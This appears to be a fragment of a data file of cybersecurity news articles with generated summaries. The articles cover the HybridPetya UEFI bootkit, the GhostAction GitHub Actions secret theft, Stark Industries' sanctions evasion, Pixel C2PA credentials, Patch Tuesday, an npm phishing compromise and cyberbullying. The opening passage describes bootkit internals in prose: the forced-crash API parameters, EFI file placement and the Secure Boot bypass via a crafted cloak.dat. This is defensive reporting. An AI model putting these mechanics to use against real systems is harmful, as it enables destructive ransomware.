(\nPARTITION_STYLE_GPT\n), and walks through the partitions until it discovers the one with\nPARTITION_INFORMATION_GPT.PartitionType\nset to\nPARTITION_SYSTEM_GUID\n, which is the identifier of the EFI System Partition. After discovering the EFI System Partition, it continues:\nRemoving the fallback UEFI bootloader, stored in\n\\EFI\\Boot\\Bootx64.efi\n.\nDropping a disk-encryption-related configuration along with the encryption flag, to the\n\\EFI\\Microsoft\\Boot\\config\nfile on the EFI System Partition; the encryption configuration contains the Salsa20 encryption key, 8-byte nonce, and victim’s personal installation key (\nbase58-encoded\ndata).\nDropping an encryption-verification array consisting of\n0x200\nbytes with value\n0x07\nto the\n\\EFI\\Microsoft\\Boot\\verify\nfile on the EFI System Partition; this array is later encrypted by the bootkit component using the same Salsa20 key as used for disk encryption. The purpose of this array is to verify whether the victim entered a valid decryption key (by decrypting the array with the entered key, and verifying that the plaintext contains an array of bytes with value\n0x07\n).\nCreating a backup of\n\\EFI\\Microsoft\\Boot\\bootmgfw.efi\n, the default bootloader for Windows-based systems, by copying it into\n\\EFI\\Microsoft\\Boot\\bootmgfw.efi.old\n.\nWhen done, it triggers a system crash (Blue Screen Of Death, BSOD) by using the same method that Petya did – invoking the\nNtRaiseHardError\nAPI with the\nErrorStatus\nparameter set to\n0xC0000350\n(\nSTATUS_HOST_DOWN\n) and the\nResponseOption\nset to value\n6\n(\nOptionShutdownSystem\n), resulting in a system shutdown.\nThe abovementioned changes ensure that on systems with Windows set as the primary OS, the bootkit binary will be executed once the device is powered on again.\nCVE-2024-7344 exploitation\nIn this section, we examine\nan archive\nthat we discovered on VirusTotal that contains a variant of the UEFI bootkit described in the\nUEFI bootkit\nsection, but this time bundled in a specially formatted\ncloak.dat\nfile related to CVE-2024-7344 – the\nUEFI Secure Boot bypass vulnerability\nthat our team publicly disclosed in early 2025.\nA list of the files present in the archive along with their contents suggests that this EFI System Partition was copied from a system already encrypted by this Petya/NotPetya copycat variant. Note that we haven’t obtained the installer responsible for deploying this version with the UEFI Secure Boot bypass, but based on the archive’s contents, which are shown in Figure 11, it would be pretty similar to the process described in the previous section. Specifically, the archive contains:\n\\EFI\\Microsoft\\Boot\\counter\n, a file already containing a non-zero value representing the number of disk clusters previously encrypted by the bootkit,\n\\EFI\\Microsoft\\Boot\\config\n, a file with the encryption flag value set to\n1\n, meaning that the disk should be already encrypted and the bootkit should proceed with displaying the ransom note,\n\\EFI\\Microsoft\\Boot\\bootmgfw.efi.old\n, a file with the first\n0x400\nbytes XORed with the value\n0x07\n,\n\\EFI\\Microsoft\\Boot\\bootmgfw.efi\n, a legitimate, but vulnerable (CVE‑2024‑7344) UEFI application signed by Microsoft (revoked in Microsoft’s dbx\nsince January 2025\n); in this section we’ll refer to this file with its original name\nreloader.efi\n, and\n\\EFI\\Microsoft\\Boot\\cloak.dat\n, a specially crafted file loadable through\nreloader.efi\nand containing the XORed bootkit binary.\nFigure 11. Archive containing the CVE-2024-7344-exploiting version of the bootkit\nAs described in our\nreport\nfrom January 2025, the exploit mechanism is quite simple. The\ncloak.dat\nfile contains specially formatted data that contains a UEFI application. When the\nreloader.efi\nbinary (deployed as\nbootmgfw.efi\n) is executed during boot, it searches for the presence of the\ncloak.dat\nfile on the EFI System Partition, and loads the embedded UEFI application from the file in a very unsafe way, completely ignoring any integrity checks, thus bypassing UEFI Secure Boot.\nNote that our blogpost from January 2025 didn’t explain the exploitation in fine detail; thus, the malware author probably reconstructed the correct\ncloak.dat\nfile format based on reverse engineering the vulnerable application on their own.\nThe vulnerability cannot be exploited on systems with Microsoft’s\nJanuary 2025\ndbx update applied. For guidance on how to protect and verify whether your system is exposed to this vulnerability, check the\nProtection and Detection\nsection of our January 2025 blogpost.\nConclusion\nHybridPetya is now at least the fourth publicly known example of a real or proof-of-concept UEFI bootkit with UEFI Secure Boot bypass functionality, joining\nBlackLotus\n(exploiting CVE‑2022‑21894),\nBootKitty\n(exploiting\nLogoFail\n), and the\nHyper-V Backdoor PoC\n(exploiting\nCVE‑2020‑26200\n). This shows that Secure Boot bypasses are not just possible – they’re becoming more common and attractive to both researchers and attackers.\nAlthough HybridPetya is not actively spreading, its technical capabilities – especially MFT encryption, UEFI system compatibility, and Secure Boot bypass – make it noteworthy for future threat monitoring.\nFor any inquiries about our research published on WeLiveSecurity, please contact us at\nthreatintel@eset.com\n.\nESET Research offers private APT intelligence reports and data feeds.

Attackers had compromised maintainer accounts and injected a malicious GitHub Actions workflow designed to trigger on code pushes or manual dispatch.Once activated, the workflow harvested secrets from the environment and exfiltrated them via acurlPOST request to an attacker-controlled server. In FastUUID’s case, its PyPI token was stolen, though no malicious package uploads were made prior to the breach being contained.Malicious workflow run (Source: GitGuardian)Further investigation revealed that the incident was far more widespread than just FastUUID.At least 817 repositories were found to contain similar malicious commits, all sending stolen secrets to the same endpoint.To maximize the theft, attackers enumerated secret names from legitimate workflows, then hardcoded them into their own scripts.By September 5, researchers had notified GitHub, npm, and PyPI, while also filing issues across 573 impacted repositories. One hundred projects, at this point, had already detected and reverted the malicious commits. Soon after disclosure, the exfiltration endpoint was taken offline, but not before significant damage occurred.The exposure affects at least nine npm and 15 PyPI packages, leaving open the possibility of malicious releases unless maintainers revoke compromised tokens. While the campaign shares similarities with the AI-powered ‘s1ngularity’ attack on over 2100 GitHub accounts from August, researchers believe GhostAction is altogether a separate operation.The Ugly | House Panel Warns of Chinese Cyber Espionage Exploiting Political CommunicationHighly targeted cyber espionage campaigns amidst tense trade negotiations between the U.S. and China have led theHouse Select Committee on China to issue anadvisory warning. These campaigns, linked to the PRC, are focused on U.S.government agencies, business groups, law firms, and think tankswhile the two economic powers continue talks on tariffs and diplomacy.According to the committee, suspected threat actors based in China impersonated Republican Party Congressman John Robert Moolenaar (R-MI) inphishingemails sent out to trusted contacts. The emails, framed as requests for input on sanctions against China, carried attachments that deployed malware to steal sensitive data and establish persistence. So far, the actors are believed to beAPT41, a prolific state-backed group known for globalespionage campaigns.Source: SOPA Images Limited via Alamy Stock Photo (Dark Reading)Moolenaar, who is also the Chairman of the House Select Committee, stressed that these attacks aim to steal U.S. strategy and leverage it against Congress, the Administration, and the American people. Historically, thecampaign aligns with tactics often used by state-sponsored threat actors, includingabuse of cloud servicesand legitimate software to obscure activity and exploit personal or unofficial communication channels. The Chinese embassy hasrejectedthe allegations, stating it “firmly opposes and combats all forms of cyber attacks and cyber crime” and opposes accusations without solid evidence.Adversaries are increasingly exploiting the extension of modern political communication. Not all exchanges occur over official government accounts or devices, and attackers are capitalizing on trusted officials that engage with partners through personal or less-secure channels. By masquerading as familiar public figures and using the rightlures, they can amplify authenticity and carry out their objectives while evading detection.",

      "content": "In May 2025, the European Union levied financial sanctions on the owners ofStark Industries Solutions Ltd., a bulletproof hosting provider that materialized two weeks before Russia invaded Ukraine and quickly became a top source of Kremlin-linked cyberattacks and disinformation campaigns. But new findings show those sanctions have done little to stop Stark from simply rebranding and transferring their assets to other corporate entities controlled by its original hosting providers.Image: Shutterstock.Materializing just two weeks before Russia invaded Ukraine in 2022, Stark Industries Solutions became a frequent source of massive DDoS attacks, Russian-language proxy and VPN services, malware tied to Russia-backed hacking groups, and fake news. ISPs like Stark are called “bulletproof” providers when they cultivate a reputation for ignoring any abuse complaints or police inquiries about activity on their networks.In May 2025, the European Unionsanctionedone of Stark’s two main conduits to the larger Internet — Moldova-basedPQ Hosting— as well as the company’s Moldovan ownersYuriandIvan Neculiti. The EU Commission said the Neculiti brothers and PQ Hosting were linked to Russia’s hybrid warfare efforts.Buta new reportfromRecorded Futurefinds that just prior to the sanctions being announced, Stark rebranded tothe[.]hosting, under control of the Dutch entityWorkTitans BV(AS209847) on June 24, 2025. The Neculiti brothers reportedly got a heads up roughly 12 days before the sanctions were announced, when Moldovan and EU media reported on the forthcoming inclusion of the Neculiti brothers in the sanctions package.In response, the Neculiti brothers moved much of Stark’s considerable address space and other resources over to a new company in Moldova calledPQ Hosting Plus S.R.L., an entity reportedly connected to the Neculiti brothers thanks tothe re-use of a phone numberfrom the original PQ Hosting.“Although the majority of associated infrastructure remains attributable to Stark Industries, these changes likely reflect an attempt to obfuscate ownership and sustain hosting services under new legal and network entities,” Recorded Future observed.Neither the Recorded Future report nor the May 2025 sanctions from the EU mentioned a second critical pillar of Stark’s network that KrebsOnSecurity identified ina May 2024 profile on the notorious bulletproof hoster: The Netherlands-based hosting providerMIRhosting.MIRhosting is operated by 38-year oldAndrey Nesterenko, whosepersonal websitesays he is an accomplished concert pianist who began performing publicly at a young age.DomainToolssays mirhosting[.]com is registered to Mr. Nesterenko and toInnovation IT Solutions Corp, which lists addresses in London and in Nesterenko’s stated hometown of Nizhny Novgorod, Russia.Image credit: correctiv.org.According to the bookInside Cyber Warfareby Jeffrey Carr, Innovation IT Solutions Corp. was responsible for hostingStopGeorgia[.]ru, a hacktivist website for organizing cyberattacks against Georgia that appeared at the same time Russian forces invaded the former Soviet nation in 2008. That conflict was thought to be the first war ever fought in which a notable cyberattack and an actual military engagement happened simultaneously.Mr. Nesterenko did not respond to requests for comment. In May 2024, Mr. Nesterenkosaidhe couldn’t verify whether StopGeorgia was ever a customer because they didn’t keep records going back that far. But he maintained that Stark Industries Solutions was merely one client of many, and claimed MIRhosting had not received any actionable complaints about abuse on Stark.However, it appears that MIRhosting is once again the new home of Stark Industries, and that MIRhosting employees are managing both the[.]hosting and WorkTitans — the primary beneficiaries of Stark’s assets.A copy of the incorporation documents for WorkTitans BV obtained from the Dutch Chamber of Commerce shows WorkTitans also does business under the namesMisfits Mediaand andWT Hosting(considering Stark’s historical connection to Russian disinformation websites, “Misfits Media” is a bit on the nose).An incorporation document for WorkTitans B.V. from the Netherlands Chamber of Commerce.The incorporation document says the company was formed in 2019 by ay.zinad@worktitans.nl. That email address corresponds toa LinkedIn accountfor aYoussef Zinad, who says their personal websites are worktitans[.]nl and custom-solution[.]nl. The profile also links to a website (etripleasims dot nl) that LinkedIn currently blocks as malicious. All of these websites are or were hosted at MIRhosting.Although Mr. Zinad’s LinkedIn profile does not mention any employment at MIRhosting, virtually all of his LinkedIn posts over the past year have been reposts of advertisements for MIRhosting’s services.Mr. Zinad’s LinkedIn profile is full of posts for MIRhosting’s services.A Google search for Youssef Zinad reveals multiple startup-tracking websites that list him as the founder of the[.]hosting, whichcensys.iofinds is hosted byPQ Hosting Plus S.R.L.The Dutch Chamber of Commerce document says WorkTitans’ sole shareholder is a company in Almere, Netherlands calledFezzy B.V.Who runs Fezzy? The phone number listed in a Google search for Fezzy B.V. —31651079755— also was used to register aFacebookprofile for a Youssef Zinad from the same town, according to the breach tracking serviceConstella Intelligence.In a series of email exchanges leading up to KrebsOnSecurity’sMay 2024 deep dive on Stark, Mr. Nesterenko included Mr. Zinad in the message thread (youssef@mirhosting.com), referring to him as part of the company’s legal team. The Dutch website stagemarkt[.]nl lists Youssef Zinad as an official contact for MIRhosting’s offices in Almere. Mr. Zinad did not respond to requests for comment.Given the above, it is difficult to argue with the Recorded Future report on Stark’s rebranding, which concluded that “the EU’s sanctioning of Stark Industries was largely ineffective, as affiliated infrastructure remained operational and services were rapidly re-established under new branding, with no significant or lasting disruption.”",
      "summary": "The threat posed by Bulletproof Host Stark Industries highlights the evolving tactics of evading sanctions through legal maneuvers and corporate restructuring. The company's ability to evade EU sanctions, despite being identified as a conduit for Russian-backed cyberattacks, demonstrates a sophisticated approach to maintaining operations under new aliases and entities. This not only challenges regulatory efforts but also underscores the need for continuous monitoring in cyberspace to detect such evasion tactics. The rebranding of Stark Industries Solutions Ltd., now operating under various corporate aliases including [.]hosting and WorkTitans BV, highlights a significant shift in infrastructure management to evade sanctions imposed by European Union due to its alleged ties with Russia-backed hacking groups. This case serves as a critical example of how cyber threats can adapt to circumvent legal restrictions, emphasizing the importance of real-time monitoring and response mechanisms.",

      "content": "Posted by Eric Lynch, Senior Product Manager, Android Security, and Sherif Hanna, Group Product Manager, Google C2PA CoreAt Made by Google 2025, we announced that the new Google Pixel 10 phones will support C2PAContent CredentialsinPixel CameraandGoogle Photos. This announcement represents a series of steps towards greater digital media transparency:The Pixel 10 lineup is the first to have Content Credentials built inacross every photo created by Pixel Camera.The Pixel Camera appachieved Assurance Level 2, the highest security ratingcurrently definedby the C2PA Conformance Program. Assurance Level 2 for a mobile app is currentlyonly possible on the Android platform.A private-by-designapproach to C2PA certificate management,  where no image or group of images can be related to one another or the person who created them.Pixel 10 phones supporton-device trusted time-stamps,which ensures images captured with your native camera app can be trusted after the certificate expires, even if they were captured when your device was offline.These capabilities arepowered by Google Tensor G5, Titan M2 security chip, the advanced hardware-backed security features of the Android platform, and Pixel engineering expertise.In this post, we’ll break down our architectural blueprint for bringing a new level of trust to digital media, and how developers can apply this model to their own apps on Android.A New Approach to Content CredentialsGenerative AI can help us all to be more creative, productive, and innovative. But it can be hard to tell the difference between content that’s been AI-generated, and content created without AI.  The ability to verify the source and history—or provenance—of digital content is more important than ever.Content Credentials convey a rich set of information about how media such as images, videos, or audio files were made, protected by the same digital signature technology that has secured online transactions and mobile apps for decades. It empowers users to identify AI-generated (or altered) content, helping to foster transparency and trust in generative AI. It can be complemented by watermarking technologies such asSynthID.Content Credentials are anindustry standard backed by a broad coalition of leading companiesfor securely conveying the origin and history of media files. The standard is developed by the Coalition for Content Provenance and Authenticity (C2PA), of which Google is a steering committee member.The traditional approach to classifying digital image content has focused on categorizing content as  “AI” vs. “not AI”. This has been the basis for manylegislative efforts, which have required the labeling of synthetic media. This traditional approach has drawbacks, as described in Chapter 5 ofthis seminal reportby Google. Research shows that if only synthetic content is labeled as “AI”, then users falsely believe unlabeled content is “not AI”, a phenomenon called “the implied truth effect”. This is why Google is taking a different approach to applying C2PA Content Credentials.Instead of categorizing digital content into a simplistic “AI” vs. “not AI”, Pixel 10 takes the first steps toward implementing our vision of categorizing digital content as either i) media that comes with verifiable proof of how it was made or ii) media that doesn't.Pixel Cameraattaches Content Credentials to any JPEG photo capture, with the appropriate description as defined by the Content Credentials specification for each capture mode.Google Photosattaches Content Credentials to JPEG images that already have Content Credentials and are edited using AI or non-AI tools, and also to any images that are edited using AI tools. It will validate and display Content Credentials under a new section in the About panel, if the JPEG image being viewed contains this data. Learn more about it inGoogle Photos Help.Given the broad range of scenarios in which Content Credentials are attached by these apps, we designed our C2PA implementation architecture from the onset to be:Secure from silicon to applicationsVerifiable, not personally identifiableUseable offlineSecure from Silicon to ApplicationsGood actors in the C2PA ecosystem are motivated to ensure that provenance data is trustworthy. C2PA Certification Authorities (CAs), such as Google, are incentivized to only issue certificates to genuine instances of apps from trusted developers in order to prevent bad actors from undermining the system. Similarly, app developers want to protect their C2PA claim signing keys from unauthorized use. And of course, users want assurance that the media files they rely on come from where they claim. For these reasons, the C2PA defined the Conformance Program.The Pixel Camera application on the Pixel 10 lineup hasachieved Assurance Level 2, the highest security ratingcurrently definedby the C2PA Conformance Program. This was made possible by a strong set of hardware-backed technologies, including Tensor G5 and the certified Titan M2 security chip, along with Android’s hardware-backed security APIs. Only mobile apps running on devices that have the necessary silicon features and Android APIs can be designed to achieve this assurance level. We are working with C2PA to help define future assurance levels that will push protections even deeper into hardware.Achieving Assurance Level 2 requires verifiable, difficult-to-forge evidence. Google has built an end-to-end system on Pixel 10 devices that verifies several key attributes. However, the security of any claim is fundamentally dependent on the integrity of the application and the OS, an integrity that relies on both being kept current with the latest security patches.Hardware Trust:Android Key Attestationin Pixel 10 is built on support for Device Identifier Composition Engine (DICE) by Tensor, and Remote Key Provisioning (RKP) to establish a trust chain from the moment the device starts up to the OS, stamping out the most common forms of abuse on Android.Genuine Device and Software:Aided by the hardware trust described above, Android Key Attestation allows Google C2PA Certification Authorities (CAs) to verify that they are communicating with a genuine physical device. It also allows them to verify the device has booted securely into aPlay Protect Certified version of Android, and verify how recently the operating system, bootloader, and system software and firmware were patched for security vulnerabilities.Genuine Application:Hardware-backed Android Key Attestation certificates include the package name and signing certificates associated with the app that requested the generation of the C2PA signing key, allowing Google C2PA CAs to check that the app requesting C2PA claim signing certificates is a trusted, registered app.Tamper-Resistant Key Storage:On Pixel, C2PA claim signing keys are generated and stored using Android StrongBox in the Titan M2 security chip. Titan M2 isCommon Criteria PP.0084 AVA_VAN.5 certified, meaning that it is strongly resistant to extracting or tampering with the cryptographic keys stored in it. Android Key Attestation allows Google C2PA CAs to verify that private keys were indeed created inside this hardware-protected vault before issuing certificates for their public key counterparts.The C2PA Conformance Program requires verifiable artifacts backed by a hardware Root of Trust, which Android provides through features like Key Attestation. This means Android developers can leverage these same tools to build apps that meet this standard for their users.Privacy Built on a Foundation of Trust: Verifiable, Not Personally IdentifiableThe robust security stack we described is the foundation of privacy. But Google takes steps further to ensure your privacy even as you use Content Credentials, which required solving two additional challenges:Challenge 1: Server-side Processing of Certificate Requests.Google’s C2PA Certification Authorities must certify new cryptographic keys generated on-device. To prevent fraud, these certificate enrollment requests need to be authenticated. A more common approach would require user accounts for authentication, but this would create a server-side record linking a user's identity to their C2PA certificates—a privacy trade-off we were unwilling to make.Our Solution: Anonymous, Hardware-Backed Attestation.We solve this with Android Key Attestation, which allows Google CAs to verify what is being used (a genuine app on a secure device) without ever knowing who is using it (the user). Our CAs also enforce a strict no-logging policy for information like IP addresses that could tie a certificate back to a user.Challenge 2: The Risk of Traceability Through Key Reuse.A significant privacy risk in any provenance system is traceability. If the same device or app-specific cryptographic key is used to sign multiple photos, those images can be linked by comparing the key. An adversary could potentially connect a photo someone posts publicly under their real name with a photo they post anonymously, deanonymizing the creator.Our Solution: Unique Certificates.We eliminate this threat with a maximally private approach. Each key and certificate is used to sign exactly one image. No two images ever share the same public key, a \"One-and-Done\" Certificate Management Strategy, making it cryptographically impossible to link them. This engineering investment in user privacy is designed to set a clear standard for the industry.Overall, you can use Content Credentials on Pixel 10 without fear that another person or Google could use it to link any of your images to you or one another.Ready to Use When You Are - Even OfflineImplementations of Content Credentials usetrusted time-stampsto ensure the credentials can be validated even after the certificate used to produce them expires. Obtaining these trusted time-stamps typically requires connectivity to a Time-Stamping Authority (TSA) server. But what happens if the device is offline?This is not a far-fetched scenario. Imagine you’ve captured a stunning photo of a remote waterfall. The image has Content Credentials that prove that it was captured by a camera, but the cryptographic certificate used to produce them will eventually expire. Without a time-stamp, that proof could become untrusted, and you're too far from a cell signal, which is required to receive one.To solve this, Pixel developed an on-device, offline TSA.Powered by the security features of Tensor, Pixel maintains a trusted clock in a secure environment, completely isolated from the user-controlled one in Android. The clock is synchronized regularly from a trusted source while the device is online, and is maintained even after the device goes offline (as long as the phone remains powered on). This allows your device to generate its own cryptographically-signed time-stamps the moment you press the shutter—no connection required. It ensures the story behind your photo remains verifiable and trusted after its certificate expires, whether you took it in your living room or at the top of a mountain.Building a More Trustworthy Ecosystem, TogetherC2PA Content Credentials are not the sole solution for identifying the provenance of digital media. They are, however, a tangible step toward more media transparency and trust as we continue to unlock more human creativity with AI.In our initial implementation of Content Credentials on the Android platform and Pixel 10 lineup, we prioritized a higher standard of privacy, security, and usability. We invite other implementers of Content Credentials to evaluate our approach and leverage these same foundational hardware and software security primitives. The full potential of these technologies can only be realized through widespread ecosystem adoption.We look forward to adding Content Credentials across more Google products in the near future.",

      "content": "Microsoft Corp.today issued security updates to fix more than 80 vulnerabilities in itsWindowsoperating systems and software. There are no known “zero-day” or actively exploited vulnerabilities in this month’s bundle from Redmond, which nevertheless includes patches for 13 flaws that earned Microsoft’s most-dire “critical” label. Meanwhile, bothAppleandGooglerecently released updates to fix zero-day bugs in their devices.Microsoft assigns security flaws a “critical” rating when malware or miscreants can exploit them to gain remote access to a Windows system with little or no help from users. Among the more concerning critical bugs quashed this month isCVE-2025-54918. The problem here resides withWindows NTLM, or NT LAN Manager, a suite of code for managing authentication in a Windows network environment.Redmond rates this flaw as “Exploitation More Likely,” and although it is listed as a privilege escalation vulnerability,Kev BreenatImmersivesays this one is actually exploitable over the network or the Internet.“From Microsoft’s limited description, it appears that if an attacker is able to send specially crafted packets over the network to the target device, they would have the ability to gain SYSTEM-level privileges on the target machine,” Breen said. “The patch notes for this vulnerability state that ‘Improper authentication in Windows NTLM allows an authorized attacker to elevate privileges over a network,’ suggesting an attacker may already need to have access to the NTLM hash or the user’s credentials.”Breen said another patch —CVE-2025-55234, a 8.8 CVSS-scored flaw affecting theWindows SMBclient for sharing files across a network — also is listed as privilege escalation bug but is likewise remotely exploitable. This vulnerability was publicly disclosed prior to this month.“Microsoft says that an attacker with network access would be able to perform a replay attack against a target host, which could result in the attacker gaining additional privileges, which could lead to code execution,” Breen noted.CVE-2025-54916is an “important” vulnerability inWindows NTFS— the default filesystem for all modern versions of Windows — that can lead to remote code execution. Microsoft likewise thinks we are more than likely to see exploitation of this bug soon: The last time Microsoft patched an NTFS bug was in March 2025 and it was already being exploited in the wild as a zero-day.“While the title of the CVE says ‘Remote Code Execution,’ this exploit is not remotely exploitable over the network, but instead needs an attacker to either have the ability to run code on the host or to convince a user to run a file that would trigger the exploit,” Breen said. “This is commonly seen in social engineering attacks, where they send the user a file to open as an attachment or a link to a file to download and run.”Critical and remote code execution bugs tend to steal all the limelight, butTenableSenior Staff Research EngineerSatnam Narangnotes that nearly half of all vulnerabilities fixed by Microsoft this month are privilege escalation flaws that require an attacker to have gained access to a target system first before attempting to elevate privileges.“For the third time this year, Microsoft patched more elevation of privilege vulnerabilities than remote code execution flaws,” Narang observed.On Sept. 3, Googlefixed two flawsthat were detected as exploited in zero-day attacks, including CVE-2025-38352, an elevation of privilege in the Android kernel, and CVE-2025-48543, also an elevation of privilege problem in the Android Runtime component.Also, Apple recently patched its seventh zero-day (CVE-2025-43300) of this year. It was part ofan exploit chainused along with a vulnerability in theWhatsApp(CVE-2025-55177) instant messenger to hack Apple devices. Amnesty Internationalreportsthat the two zero-days have been used in “an advanced spyware campaign” over the past 90 days. The issue is fixed in iOS 18.6.2, iPadOS 18.6.2, iPadOS 17.7.10, macOS Sequoia 15.6.1, macOS Sonoma 14.7.8, and macOS Ventura 13.7.8.TheSANS Internet Storm Centerhas aclickable breakdownof each individual fix from Microsoft, indexed by severity and CVSS score.

      "content": "At least 18 popular JavaScript code packages that are collectively downloaded more than two billion times each week were briefly compromised with malicious software today, after a developer involved in maintaining the projects was phished. The attack appears to have been quickly contained and was narrowly focused on stealing cryptocurrency. But experts warn that a similar attack with a slightly more nefarious payload could lead to a disruptive malware outbreak that is far more difficult to detect and restrain.This phishing email lured a developer into logging in at a fake NPM website and supplying a one-time token for two-factor authentication. The phishers then used that developer’s NPM account to add malicious code to at least 18 popular JavaScript code packages.Aikidois a security firm in Belgium that monitors new code updates to major open-source code repositories, scanning any code updates for suspicious and malicious code. In a blog post published today, Aikido said its systems found malicious code had been added to at least 18 widely-used code libraries available onNPM(short for) “Node Package Manager,” which acts as a central hub for JavaScript development and the latest updates to widely-used JavaScript components.JavaScript is a powerful web-based scripting language used by countless websites to build a more interactive experience with users, such as entering data into a form. But there’s no need for each website developer to build a program from scratch for entering data into a form when they can just reuse already existing packages of code at NPM that are specifically designed for that purpose.Unfortunately, if cybercriminals manage to phish NPM credentials from developers, they can introduce malicious code that allows attackers to fundamentally control what people see in their web browser when they visit a website that uses one of the affected code libraries.According to Aikido, the attackers injected a piece of code that silently intercepts cryptocurrency activity in the browser, “manipulates wallet interactions, and rewrites payment destinations so that funds and approvals are redirected to attacker-controlled accounts without any obvious signs to the user.”“This malware is essentially a browser-based interceptor that hijacks both network traffic and application APIs,” Aikido researcherCharlie Eriksenwrote. “What makes it dangerous is that it operates at multiple layers: Altering content shown on websites, tampering with API calls, and manipulating what users’ apps believe they are signing. Even if the interface looks correct, the underlying transaction can be redirected in the background.”Aikido said it used the social network Bsky to notify the affected developer,Josh Junon, who quickly replied that he was aware of having just been phished. The phishing email that Junon fell for was part of a larger campaign that spoofed NPM and told recipients they were required to update their two-factor authentication (2FA) credentials. The phishing site mimicked NPM’s login page, and intercepted Junon’s credentials and 2FA token. Once logged in, the phishers then changed the email address on file for Junon’s NPM account, temporarily locking him out.Aikido notified the maintainer on Bluesky, who replied at 15:15 UTC that he was aware of being compromised, and starting to clean up the compromised packages.Junon also issued a mea culpaon HackerNews, telling the community’s coder-heavy readership, “Hi, yep I got pwned.”“It looks and feels a bit like a targeted attack,” Junon wrote. “Sorry everyone, very embarrassing.”Philippe Caturegli, “chief hacking officer” at the security consultancySeralys, observed that the attackers appear to have registered their spoofed website — npmjs[.]help — just two days before sending the phishing email. The spoofed website used services from dnsexit[.]com, a “dynamic DNS” company that also offers “100% free” domain names that can instantly be pointed at any IP address controlled by the user.Junon’s mea cupla on Hackernews today listed the affected packages.Caturegli said it’s remarkable that the attackers in this case were not more ambitious or malicious with their code modifications.“The crazy part is they compromised billions of websites and apps just to target a couple of cryptocurrency things,” he said. “This was a supply chain attack, and it could easily have been something much worse than crypto harvesting.”Aikido’s Eriksen agreed, saying countless websites dodged a bullet because this incident was handled in a matter of hours. As an example of how these supply-chain attacks can escalate quickly, Eriksen pointed toanother compromise of an NPM developer in late Augustthat added malware to “nx,” an open-source code development toolkit with as many as six million weekly downloads.In the nx compromise, the attackers introduced code that scoured the user’s device for authentication tokens from programmer destinations like GitHub and NPM, as well as SSH and API keys. But instead of sending those stolen credentials to a central server controlled by the attackers, the malicious code created a new public repository in the victim’s GitHub account, and published the stolen data there for all the world to see and download.Eriksen said coding platforms like GitHub and NPM should be doing more to ensure that any new code commits for broadly-used packages require a higher level of attestation that confirms the code in question was in fact submitted by the person who owns the account, and not just by that person’s account.“More popular packages should require attestation that it came through trusted provenance and not just randomly from some location on the Internet,” Eriksen said. “Where does the package get uploaded from, by GitHub in response to a new pull request into the main branch, or somewhere else? In this case, they didn’t compromise the target’s GitHub account. They didn’t touch that. They just uploaded a modified version that didn’t come where it’s expected to come from.”Eriksen said code repository compromises can be devastating for developers, many of whom end up abandoning their projects entirely after such an incident.“It’s unfortunate because one thing we’ve seen is people have their projects get compromised and they say, ‘You know what, I don’t have the energy for this and I’m just going to deprecate the whole package,'” Eriksen said.Kevin Beaumont, a frequently quoted security expert who writes about security incidents at the blog doublepulsar.com, has been following this story closely today in frequent updates tohis account on Mastodon. Beaumont said the incident is a reminder that much of the planet still depends on code that is ultimately maintained by an exceedingly small number of people who are mostly overburdened and under-resourced.“For about the past 15 years every business has been developing apps by pulling in 178 interconnected libraries written by 24 people in a shed in Skegness,” Beaumont wrote on Mastodon. “For about the past 2 years orgs have been buying AI vibe coding tools, where some exec screams ‘make online shop’ into a computer and 389 libraries are added and an app is farted out. The output = if you want to own the world’s companies, just phish one guy in Skegness.”Image: https://infosec.exchange/@GossiTheDog@cyberplace.social.Aikido recently launched a product that aims to help development teams ensure that every code library used is checked for malware before it can be used or installed.Nicholas Weaver, a researcher with the International Computer Science Institute, a nonprofit in Berkeley, Calif., said Aikido’s new offering exists because many organizations are still one successful phishing attack away from a supply-chain nightmare.Weaver said these types of supply-chain compromises will continue as long as people responsible for maintaining widely-used code continue to rely on phishable forms of 2FA.“NPM should only support phish-proof authentication,” Weaver said, referring tophysical security keysthat are phish-proof — meaning that even if phishers manage to steal your username and password, they still can’t log in to your account without also possessing that physical key.“All critical infrastructure needs to use phish-proof 2FA, and given the dependencies in modern software, archives such as NPM are absolutely critical infrastructure,” Weaver said. “That NPM does not require that all contributor accounts use security keys or similar 2FA methods should be considered negligence.”",
      "summary": "A significant cybersecurity incident was reported where at least 18 popular JavaScript code packages were hacked and manipulated by malicious actors through a phishing attack. The attackers successfully compromised the developer's NPM account by sending a fake login request, gaining access to his credentials and two-factor authentication token. Once logged in, they injected malicious software into the affected code packages, which could silently intercept cryptocurrency activities within users' browsers, redirecting transactions to attacker-controlled accounts without any obvious signs to the user. This incident highlights the vulnerability of open-source code libraries used by numerous websites and applications globally, emphasizing the importance of robust security practices in maintaining such platforms.\n\nThe attack demonstrates a potential risk for more disruptive malware outbreaks if not contained effectively. It also underscores the need for developers and organizations to implement stronger authentication methods and regular security audits to prevent unauthorized access and malicious modifications to code libraries.",

      "published_date": "2025-08-27",
      "content": "For better or worse, the digital world in many ways resembles its physical counterpart. Unfortunately, that means it sometimes enables, and even exacerbates, the same bad behaviors that we often\nsee offline\n. According to a\n2023 Microsoft study covering 17 countries,\n“cyberbullying harassment and abuse” is the top concern for parents across the globe, preoccupying on average 39% of respondents.\nIf left to fester, it can have a significant impact on the mental health and even physical wellbeing of your kids. In some isolated cases, it has led to even more\ntragic outcomes for victims\n. We all need to make sure, therefore, that the beginning of the new term doesn’t kickstart a new surge in\nunacceptable online behavior\n.\nNew year, same old problems?\nThe aforementioned Microsoft study indicates that parents are slightly more concerned about cyberbullying than they are of the risk of child sexual exploitation, disinformation and threats of physical violence. It chimes with a Pew Research Center\nstudy claiming\nthat around half of US teens have experienced online harassment, with older girls more likely to be in the firing line. This can take many forms, from name calling and the spreading of false rumors, to sharing of explicit images (potentially of the victim) and physical threats.\nSuch activity may be worse at the start of the new school year in September, when bullies may try to assert dominance over their peers, new cliques form and academic pressures create new anxieties. Both parents and schools may be focused on other matters at the start of the term, meaning potentially serious issues slip through the cracks. In this context, it’s vital that you’re able to spot the warning signs of cyberbullying before things spiral out of control.\nHow can I tell if my child is being bullied online?\nGetting your child to open up about their experiences is the first and often hardest part about tackling cyberbullying. They may be embarrassed to tell you, or scared that it could make things worse. So keep your eyes peeled for sudden changes in behavior that may indicate something isn’t quite right.\nThis may include unusual mood swings, low self-esteem, a lack of interest in hobbies, big changes in screen time (more or less), avoidance of school/social gatherings and slipping grades. They may appear fatigued and change their eating habits. And they may become defensive if you try to talk about it.\nRELATED READING:\n\"What happens online stays online\" and other cyberbullying myths, debunked\nSome best practices for tackling cyberbullying\nIt can be easier said than done, but trying to keep the lines of communication open in such circumstances is beyond doubt the most positive thing you can do. 